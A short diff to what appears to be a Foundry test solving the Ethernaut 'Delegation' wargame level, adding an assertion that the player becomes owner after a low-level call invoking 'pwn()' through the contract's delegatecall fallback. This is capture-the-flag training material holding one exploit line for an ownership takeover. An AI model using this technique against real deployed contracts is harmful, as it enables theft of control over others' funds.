@@ -38,7 +38,7 @@ contract DelegationTest is Test {
          *2. straightforwad way
          */
         address(ethernautDelegation).call(abi.encodeWithSignature("pwn()"));
-
+        assertEq(ethernautDelegation.owner(), player);
         /*****************
          *Level Submission*
          ***************  */
